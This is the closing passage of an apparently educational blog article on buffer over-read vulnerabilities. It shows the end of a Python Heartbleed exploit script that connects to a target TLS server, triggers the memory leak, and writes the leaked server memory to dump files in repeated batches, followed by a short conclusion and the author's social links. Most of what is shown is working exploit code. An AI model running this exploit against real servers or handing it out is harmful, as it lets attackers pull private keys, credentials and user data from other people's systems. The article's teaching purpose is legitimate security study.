</span></span><span style="display:flex;"><span>            print_success(Color<span style="color:#f92672">.</span>Bold<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;The target server is vulnerable and we were able to leak </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> bytes&#34;</span> <span style="color:#f92672">%</span> (len(leaks) <span style="color:#f92672">-</span> len(heartbleed)))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> leaks
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_error(<span style="color:#e6db74">&#34;The target server is not vulnerable&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tls_init_client</span>():
</span></span><span style="display:flex;"><span>    sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket( socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        sock<span style="color:#f92672">.</span>connect( (TARGET, PORT) )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        print_error(<span style="color:#e6db74">&#34;Target server is unreachable&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> tls_handshake(sock):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sock
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leaks_into_file</span>(filename, content):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print_status(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Server leaks have been written into &#39;</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    banner()
</span></span><span style="display:flex;"><span>    tls_client <span style="color:#f92672">=</span> tls_init_client()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> tls_client:
</span></span><span style="display:flex;"><span>        ctr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ctr <span style="color:#f92672">&lt;</span> BATCHES:
</span></span><span style="display:flex;"><span>            server_memory_content <span style="color:#f92672">=</span> tls_heartbleed( tls_client )
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> server_memory_content:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ctr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            leaks_into_file(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{</span>str(ctr)<span style="color:#e6db74">}</span><span style="color:#e6db74">.dmp&#34;</span>, server_memory_content)
</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep( TIMEOUT )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        tls_client<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> bool(ctr):
</span></span><span style="display:flex;"><span>            print_success(<span style="color:#e6db74">&#34;We have dumped </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> batches successfully&#34;</span> <span style="color:#f92672">%</span> ctr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>To summarize the article, we discussed the definition of buffer over-read vulnerabilities. We explained their effect or impact and how they can be exploited. We also built a simple vulnerable code to experiment with it. We analyzed it well, picked up its flaws and weaknesses, and exploited them. We explained how the TLS and DTLS protocols work. We also analyzed a vulnerability in them. We carefully studied their code, thought of a plan to break it, and developed a successful exploit.</p>
<p><strong>I wish you are here and thank you all for reading.</strong></p>
</div>
    </article>
  </main>

      </div>
      <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/0xNinjaCyclone">GitHub</a>
      
         | 
        <a href="https://twitter.com/0xNinjaCyclone">Twitter</a>
      
         | 
        <a href="https://www.facebook.com/abdallah.elsharif07">Facebook</a>
      
    </p>
  
</footer>

    </div>
  </body>
</html>
